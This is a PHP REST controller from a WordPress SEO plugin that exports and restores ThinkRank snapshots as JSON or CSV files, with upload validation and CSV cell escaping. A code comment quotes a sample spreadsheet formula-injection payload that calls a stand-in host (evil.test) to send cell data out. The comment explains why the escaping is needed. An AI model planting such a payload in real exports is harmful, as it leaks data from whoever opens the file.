<?php

/**
 * Export Controller
 *
 * REST endpoints that move a ThinkRank snapshot in and out of the site as a
 * single portable file.
 *
 * Snapshots themselves live in wp_options (Snapshot_Store), which is fine for a
 * migration that starts and ends on one site but is not something a user can
 * carry anywhere. These two routes are the bridge: `download` serialises a
 * completed snapshot into one file, `upload` puts that file back into
 * Snapshot_Store so the existing /import/migrate loop can drain it — the
 * restore itself needs no new transport.
 *
 * @package ThinkRank\Admin\Importers
 * @since 2.2.0
 */

declare(strict_types=1);

namespace ThinkRank\Admin\Importers;

if (!defined('ABSPATH')) {
    exit;
}

/**
 * Export Controller Class
 *
 * @since 2.2.0
 */
class Export_Controller extends \WP_REST_Controller {

    /**
     * @var string
     */
    protected $namespace = 'thinkrank/v1';

    /**
     * @var string
     */
    protected $rest_base = 'export';

    /**
     * Envelope marker every ThinkRank export file carries.
     */
    public const FILE_FORMAT = 'thinkrank-export';

    /**
     * Envelope version this build writes, and the highest it can read.
     *
     * Bump on a BREAKING change to the envelope or record shape. A file
     * declaring a higher version is refused rather than partially applied: a
     * half-restored site is worse than a clear "upgrade first".
     */
    public const SCHEMA_VERSION = 1;

    /**
     * Records per snapshot chunk, matching Abstract_Plugin_Exporter::$chunk_size
     * so an uploaded file paginates the same way a locally-produced snapshot does.
     */
    private const CHUNK_SIZE = 100;


    /**
     * CSV columns for the human-readable post meta view.
     *
     * @var array<string,string> Column heading => meta key ('' for computed).
     */
    private const CSV_COLUMNS = [
        'post_id'             => '',
        'post_title'          => '',
        'permalink'           => '',
        'seo_title'           => '_thinkrank_seo_title',
        'meta_description'    => '_thinkrank_meta_description',
        'focus_keyword'       => '_thinkrank_focus_keyword',
        'canonical_url'       => '_thinkrank_canonical_url',
        'robots_meta'         => '_thinkrank_robots_meta',
        'og_title'            => '_thinkrank_og_title',
        'og_description'      => '_thinkrank_og_description',
        'og_image'            => '_thinkrank_og_image',
        'twitter_title'       => '_thinkrank_twitter_title',
        'twitter_description' => '_thinkrank_twitter_description',
        'twitter_image'       => '_thinkrank_twitter_image',
        'schema_type'         => '_thinkrank_selected_schema_type',
    ];

    /**
     * Register REST routes
     *
     * @return void
     */
    public function register_routes(): void {
        register_rest_route($this->namespace, '/' . $this->rest_base . '/download', [
            [
                'methods'             => \WP_REST_Server::READABLE,
                'callback'            => [$this, 'download'],
                'permission_callback' => [$this, 'check_permissions'],
                'args'                => [
                    'format' => [
                        'required'          => false,
                        'type'              => 'string',
                        'enum'              => ['json', 'csv'],
                        'default'           => 'json',
                        'sanitize_callback' => 'sanitize_text_field',
                    ],
                    // The snapshot has served its purpose once the file is in
                    // the user's hands, and Snapshot_Store has no retention
                    // policy — a large site leaves hundreds of option rows
                    // behind otherwise.
                    'cleanup' => [
                        'required' => false,
                        'type'     => 'boolean',
                        'default'  => true,
                    ],
                ],
            ],
        ]);

        register_rest_route($this->namespace, '/' . $this->rest_base . '/upload', [
            [
                'methods'             => \WP_REST_Server::CREATABLE,
                'callback'            => [$this, 'upload'],
                'permission_callback' => [$this, 'check_permissions'],
            ],
        ]);
    }

    /**
     * Permission check — manage_options required
     *
     * @return bool
     */
    public function check_permissions(): bool {
        return current_user_can('manage_options');
    }

    /**
     * GET /export/download — send a completed snapshot as one file.
     *
     * The browser reaches this as a plain navigation rather than an apiFetch
     * call, so cookie auth needs the nonce in the query string (`_wpnonce`),
     * which the REST server accepts alongside the X-WP-Nonce header.
     *
     * @param \WP_REST_Request $request Request object
     * @return \WP_REST_Response|\WP_Error
     */
    public function download(\WP_REST_Request $request) {
        $manifest = Snapshot_Store::get_manifest(Thinkrank_Exporter::SLUG);

        if (!$manifest || ($manifest['status'] ?? '') !== 'complete') {
            return new \WP_Error(
                'thinkrank_export_not_ready',
                __('No completed ThinkRank export is available. Run the export first.', 'thinkrank'),
                ['status' => 404]
            );
        }

        $format   = (string) $request->get_param('format');
        $filename = $this->build_filename($format);

        // WordPress serialises REST responses as JSON. Taking over
        // rest_pre_serve_request is the documented way to send something else,
        // and it keeps the route inside the REST permission/nonce plumbing
        // instead of bolting the download onto admin-post.php.
        add_filter(
            'rest_pre_serve_request',
            function (bool $served, $result, $req, $server) use ($manifest, $format, $filename, $request): bool {
                // Another route's response passing through the same filter.
                if ($req !== $request) {
                    return $served;
                }

                $this->send_download_headers($format, $filename);

                if ($format === 'csv') {
                    $this->stream_csv($manifest);
                } else {
                    $this->stream_json($manifest);
                }

                if ((bool) $request->get_param('cleanup')) {
                    Snapshot_Store::delete_snapshot(Thinkrank_Exporter::SLUG);
                    (new Import_Detector())->clear_cache();
                }

                return true;
            },
            10,
            4
        );

        return new \WP_REST_Response(null, 200);
    }

    /**
     * POST /export/upload — load an export file back into Snapshot_Store.
     *
     * @param \WP_REST_Request $request Request object
     * @return \WP_REST_Response|\WP_Error
     */
    public function upload(\WP_REST_Request $request) {
        $files = $request->get_file_params();
        $file  = $files['file'] ?? null;

        if (!is_array($file) || !isset($file['tmp_name'])) {
            return new \WP_Error(
                'thinkrank_upload_missing_file',
                __('No file was uploaded. Attach the export file as the "file" field.', 'thinkrank'),
                ['status' => 400]
            );
        }

        if (isset($file['error']) && (int) $file['error'] !== UPLOAD_ERR_OK) {
            return new \WP_Error(
                'thinkrank_upload_failed',
                __('The file could not be uploaded. It may be larger than this server allows.', 'thinkrank'),
                ['status' => 400]
            );
        }

        // Checked before reading so an oversized file costs a stat, not memory.
        // The size comes from the upload params; falling back to a stat only
        // matters for a caller that assembled them by hand.
        //
        // The ceiling is the server's own upload limit rather than a number of
        // ours — the same bound every WordPress importer works within. A lower
        // invented limit would reject files the server would happily have
        // taken, and wp_max_upload_size() is min(upload_max_filesize,
        // post_max_size), so the message can name the setting that has to
        // change.
        $max_bytes = $this->get_max_upload_bytes();
        $size = isset($file['size'])
            ? (int) $file['size']
            : (int) (is_readable($file['tmp_name']) ? filesize($file['tmp_name']) : 0);
        if ($max_bytes > 0 && $size > $max_bytes) {
            return new \WP_Error(
                'thinkrank_upload_too_large',
                sprintf(
                    /* translators: %s: maximum upload size this server accepts, e.g. "64 MB". */
                    __('The export file is larger than the %s this server accepts. Raise the PHP upload_max_filesize and post_max_size limits, or export fewer data types at a time.', 'thinkrank'),
                    size_format($max_bytes)
                ),
                ['status' => 400]
            );
        }

        // phpcs:ignore WordPress.WP.AlternativeFunctions.file_get_contents_file_get_contents -- reading an uploaded temp file, not a remote resource.
        $raw = file_get_contents($file['tmp_name']);
        if ($raw === false || $raw === '') {
            return new \WP_Error(
                'thinkrank_upload_unreadable',
                __('The export file could not be read.', 'thinkrank'),
                ['status' => 400]
            );
        }

        $payload = json_decode($raw, true);
        unset($raw);

        $validation = $this->validate_payload($payload);
        if (is_wp_error($validation)) {
            return $validation;
        }

        $stored = $this->store_payload($payload);
        if (is_wp_error($stored)) {
            return $stored;
        }

        return new \WP_REST_Response($stored, 200);
    }

    /**
     * The largest upload this server accepts, in bytes.
     *
     * @return int Bytes, or 0 when the limit cannot be determined.
     */
    private function get_max_upload_bytes(): int {
        if (!function_exists('wp_max_upload_size')) {
            return 0;
        }

        return (int) wp_max_upload_size();
    }

    /**
     * Validate an uploaded payload's envelope.
     *
     * @param mixed $payload Decoded file contents
     * @return true|\WP_Error
     */
    private function validate_payload($payload) {
        if (!is_array($payload)) {
            return new \WP_Error(
                'thinkrank_upload_invalid_json',
                __('The file is not valid JSON. Restore expects the .json export, not the CSV view.', 'thinkrank'),
                ['status' => 400]
            );
        }

        if (($payload['format'] ?? '') !== self::FILE_FORMAT) {
            return new \WP_Error(
                'thinkrank_upload_wrong_format',
                __('This is not a ThinkRank export file.', 'thinkrank'),
                ['status' => 400]
            );
        }

        $version = isset($payload['schema_version']) ? (int) $payload['schema_version'] : 0;
        if ($version < 1 || $version > self::SCHEMA_VERSION) {
            return new \WP_Error(
                'thinkrank_upload_unsupported_version',
                sprintf(
                    /* translators: 1: file's schema version, 2: highest supported version. */
                    __('This export file uses format version %1$d, but this version of ThinkRank only reads up to version %2$d. Update ThinkRank and try again.', 'thinkrank'),
                    $version,
                    self::SCHEMA_VERSION
                ),
                ['status' => 400]
            );
        }

        // An empty `data` object is rejected rather than accepted as a no-op
        // snapshot: telling the user the file is "ready to restore" when it
        // carries nothing reads as success and restores nothing.
        if (!isset($payload['data']) || !is_array($payload['data']) || empty($payload['data'])) {
            return new \WP_Error(
                'thinkrank_upload_no_data',
                __('The export file contains no data.', 'thinkrank'),
                ['status' => 400]
            );
        }

        return true;
    }

    /**
     * Write a validated payload into Snapshot_Store as a complete snapshot.
     *
     * @param array $payload Validated payload
     * @return array|\WP_Error Response body, or an error when nothing was stored
     */
    private function store_payload(array $payload) {
        // Clear first. Writing over a previous snapshot leaves any chunk pages
        // the new file does not reach — a smaller export after a larger one
        // would otherwise restore the tail of the old data too.
        Snapshot_Store::delete_snapshot(Thinkrank_Exporter::SLUG);

        $manifest = [
            'plugin'            => Thinkrank_Exporter::SLUG,
            'plugin_name'       => 'ThinkRank',
            'exported_at'       => (string) ($payload['exported_at'] ?? gmdate('c')),
            'version'           => '1.0',
            'types'             => [],
            'status'            => 'complete',
            'last_migrated'     => null,
            'migration_version' => null,
            // Provenance, so the UI can warn when a file came from elsewhere.
            'source_site_url'   => (string) ($payload['site_url'] ?? ''),
            'source_version'    => (string) ($payload['plugin_version'] ?? ''),
            'schema_version'    => (int) $payload['schema_version'],
        ];

        foreach ($this->payload_types($payload) as $type => $data_key) {
            // $type is the sanitised slug the chunks are stored under; $data_key
            // is the key it came from in the file. Reading with the sanitised
            // name would miss every type whose name sanitising changed, and
            // drop its records while still reporting success.
            $records = $payload['data'][$data_key] ?? null;
            if (!is_array($records) || empty($records)) {
                continue;
            }

            // array_values so a JSON object with numeric string keys still
            // chunks as a list.
            $pages = array_chunk(array_values($records), self::CHUNK_SIZE);
            foreach ($pages as $index => $page_records) {
                Snapshot_Store::write_chunk(Thinkrank_Exporter::SLUG, $type, $index + 1, $page_records);
            }

            $manifest['types'][$type] = [
                'total_records' => count($records),
                'total_chunks'  => count($pages),
            ];
        }

        // Nothing landed. The envelope validated, so the file looked like ours,
        // but every type in it was empty or unreadable — saying "ready to
        // restore" here would read as success and restore nothing, which is the
        // same failure the empty-`data` check above exists to prevent.
        if (empty($manifest['types'])) {
            Snapshot_Store::delete_snapshot(Thinkrank_Exporter::SLUG);

            return new \WP_Error(
                'thinkrank_upload_no_records',
                __('The export file carries no records this version can read. It may have been produced by a newer ThinkRank, or edited by hand.', 'thinkrank'),
                ['status' => 400]
            );
        }

        Snapshot_Store::write_manifest(Thinkrank_Exporter::SLUG, $manifest);
        (new Import_Detector())->clear_cache();

        return [
            'status'   => 'complete',
            'message'  => __('Export file loaded. Ready to restore.', 'thinkrank'),
            'manifest' => $manifest,
        ];
    }

    /**
     * Types to store from an uploaded file.
     *
     * Everything the file carries, not just what is registered here. A file
     * exported on a Pro site and uploaded on a free one would otherwise lose
     * Pro's records at the door — and the restore side deliberately leaves
     * records it has no handler for sitting in the snapshot, so that a later
     * Pro activation can drain the same file. Dropping them here would make
     * that promise a lie.
     *
     * Registered types come first so the restore runs in the usual order.
     *
     * @param array $payload Validated payload
     * @return array<string,string> Sanitised type slug => the key it has in the file
     */
    private function payload_types(array $payload): array {
        // The slug becomes an option name via Snapshot_Store, so a hand-edited
        // file must not be able to steer where the chunks land. The original key
        // is carried alongside it because that is what the records are filed
        // under in `data` — sanitising is for the destination, not the lookup.
        $present = [];
        foreach (array_keys((array) $payload['data']) as $key) {
            $slug = sanitize_key((string) $key);
            // First one wins, so two keys that sanitise alike cannot have the
            // second silently overwrite the first's chunks.
            if ($slug !== '' && !isset($present[$slug])) {
                $present[$slug] = (string) $key;
            }
        }

        $ordered = [];
        foreach (Thinkrank_Exporter::get_exportable_types() as $type) {
            if (isset($present[$type])) {
                $ordered[$type] = $present[$type];
                unset($present[$type]);
            }
        }

        // Union rather than array_merge: these keys are type slugs, and
        // array_merge would renumber any that look like integers.
        return $ordered + $present;
    }

    /**
     * Stream the snapshot as one JSON document.
     *
     * Written piece by piece rather than assembled into an array and encoded in
     * one go: on a large site the whole snapshot does not need to exist in
     * memory at once, and only a chunk does.
     *
     * @param array $manifest Snapshot manifest
     * @return void
     */
    private function stream_json(array $manifest): void {
        $envelope = $this->build_envelope($manifest);

        // Encode the envelope, then splice the streamed data in where the
        // placeholder sits, so the header fields stay properly escaped.
        $header = wp_json_encode($envelope);
        // Drop the closing brace; the data object and the brace are appended below.
        echo substr((string) $header, 0, -1); // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped -- JSON document, not markup.
        echo ',"data":{'; // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped

        $first_type = true;
        foreach (array_keys($manifest['types'] ?? []) as $type) {
            if (!$this->type_has_records($manifest, (string) $type)) {
                continue;
            }

            echo $first_type ? '' : ','; // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped
            echo wp_json_encode((string) $type) . ':['; // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped
            $first_type = false;

            $first_record = true;
            foreach ($this->read_records($manifest, (string) $type) as $record) {
                echo $first_record ? '' : ','; // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped
                echo (string) wp_json_encode($record); // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped
                $first_record = false;
            }

            echo ']'; // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped
        }

        echo '}}'; // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped
    }

    /**
     * Stream the post meta as CSV.
     *
     * A readable view of the data, not a restore format — restore is JSON only.
     * That is the point of it: it is what a user takes to a spreadsheet, or to
     * another plugin's importer, and it is why ThinkRank does not need to own a
     * mapping into anyone else's meta keys.
     *
     * @param array $manifest Snapshot manifest
     * @return void
     */
    private function stream_csv(array $manifest): void {
        $handle = fopen('php://output', 'w');
        if ($handle === false) {
            return;
        }

        fputcsv($handle, array_keys(self::CSV_COLUMNS));

        foreach ($this->read_records($manifest, 'postmeta') as $record) {
            $post_id = (int) ($record['object_id'] ?? 0);
            $meta    = (array) ($record['data'] ?? []);
            $row     = [];

            foreach (self::CSV_COLUMNS as $column => $meta_key) {
                if ($column === 'post_id') {
                    $row[] = $post_id;
                    continue;
                }
                if ($column === 'post_title') {
                    $row[] = $post_id ? (string) get_the_title($post_id) : '';
                    continue;
                }
                if ($column === 'permalink') {
                    $row[] = $post_id ? (string) get_permalink($post_id) : '';
                    continue;
                }

                $row[] = $this->stringify_for_csv($meta[$meta_key] ?? '');
            }

            // Escaped at the point of writing so every column is covered — the
            // computed ones (post title, permalink) carry user input too.
            fputcsv($handle, array_map([$this, 'escape_csv_cell'], $row));
        }

        fclose($handle); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_fclose -- php://output stream, not a filesystem path; WP_Filesystem has no equivalent.
    }

    /**
     * Yield every record of a type, one chunk at a time.
     *
     * @param array  $manifest Snapshot manifest
     * @param string $type     Data type
     * @return \Generator
     */
    private function read_records(array $manifest, string $type): \Generator {
        $total_chunks = (int) ($manifest['types'][$type]['total_chunks'] ?? 0);

        for ($page = 1; $page <= $total_chunks; $page++) {
            $chunk = Snapshot_Store::read_chunk(Thinkrank_Exporter::SLUG, $type, $page);
            if (empty($chunk)) {
                continue;
            }

            foreach ($chunk as $record) {
                yield $record;
            }
        }
    }

    /**
     * Whether a type belongs in the file at all.
     *
     * The snapshot manifest records a chunk page for a type even when the page
     * held no records (update_manifest() keys total_chunks off the page number,
     * not the count), so an untouched type shows up as
     * `total_records: 0, total_chunks: 1`. Writing that into the file would
     * advertise data the file does not contain.
     *
     * @param array  $manifest Snapshot manifest
     * @param string $type     Data type
     * @return bool
     */
    private function type_has_records(array $manifest, string $type): bool {
        if (!in_array($type, Thinkrank_Exporter::get_exportable_types(), true)) {
            return false;
        }

        return (int) ($manifest['types'][$type]['total_records'] ?? 0) > 0;
    }

    /**
     * Build the file envelope (everything but `data`).
     *
     * @param array $manifest Snapshot manifest
     * @return array
     */
    private function build_envelope(array $manifest): array {
        $types = [];
        foreach ((array) ($manifest['types'] ?? []) as $type => $info) {
            if (!$this->type_has_records($manifest, (string) $type)) {
                continue;
            }

            $types[$type] = [
                'total_records' => (int) ($info['total_records'] ?? 0),
                'total_chunks'  => (int) ($info['total_chunks'] ?? 0),
            ];
        }

        return [
            'format'         => self::FILE_FORMAT,
            'schema_version' => self::SCHEMA_VERSION,
            'plugin_version' => defined('THINKRANK_VERSION') ? THINKRANK_VERSION : '',
            'site_url'       => home_url(),
            'exported_at'    => (string) ($manifest['exported_at'] ?? gmdate('c')),
            'types'          => $types,
        ];
    }

    /**
     * Neutralise a spreadsheet formula in a CSV cell.
     *
     * Excel, LibreOffice and Sheets treat a cell opening with `=`, `+`, `-` or
     * `@` as a formula, so a post whose SEO title is
     * `=HYPERLINK("http://evil.test?x="&A1,"click")` runs on open. The values
     * here are not the exporting admin's own: SEO titles and post titles are
     * editable by contributors and editors, and the admin is the one who
     * downloads the file — so the cell crosses a privilege boundary.
     *
     * Leading tab and carriage return are included because a spreadsheet strips
     * them and then reads the character underneath as the first one.
     *
     * A leading apostrophe is the standard neutraliser: spreadsheets read the
     * cell as text and do not display the quote.
     *
     * A plain number is let through: `-5` opens with a trigger character but is
     * no formula, and quoting it would land the value in the sheet as text.
     * Nothing in CSV_COLUMNS is numeric today, so this only keeps a future
     * column honest — `-5+cmd|...` is not numeric and is still escaped.
     *
     * @param mixed $value Cell value
     * @return string
     */
    private function escape_csv_cell($value): string {
        $value = (string) $value;

        if ($value === '' || is_numeric($value)) {
            return $value;
        }

        return in_array($value[0], ['=', '+', '-', '@', "\t", "\r"], true)
            ? "'" . $value
            : $value;
    }

    /**
     * Flatten a meta value into a single CSV cell.
     *
     * @param mixed $value Meta value
     * @return string
     */
    private function stringify_for_csv($value): string {
        if (is_string($value)) {
            return $value;
        }

        if (is_scalar($value)) {
            return (string) $value;
        }

        if ($value === null) {
            return '';
        }

        return (string) wp_json_encode($value);
    }

    /**
     * Build the download filename.
     *
     * @param string $format File format
     * @return string
     */
    private function build_filename(string $format): string {
        $host = wp_parse_url(home_url(), PHP_URL_HOST);
        $host = sanitize_file_name((string) ($host ?: 'site'));

        return sprintf('thinkrank-export-%s-%s.%s', $host, gmdate('Y-m-d'), $format === 'csv' ? 'csv' : 'json');
    }

    /**
     * Send the file download headers.
     *
     * @param string $format   File format
     * @param string $filename Download filename
     * @return void
     */
    private function send_download_headers(string $format, string $filename): void {
        if (headers_sent()) {
            return;
        }

        header('Content-Type: ' . ($format === 'csv' ? 'text/csv; charset=utf-8' : 'application/json; charset=utf-8'));
        header('Content-Disposition: attachment; filename="' . $filename . '"');
        // The payload can contain every SEO setting on the site; it must not sit
        // in a proxy or browser cache.
        header('Cache-Control: no-store, no-cache, must-revalidate');
        header('Pragma: no-cache');
        header('X-Content-Type-Options: nosniff');
    }
}
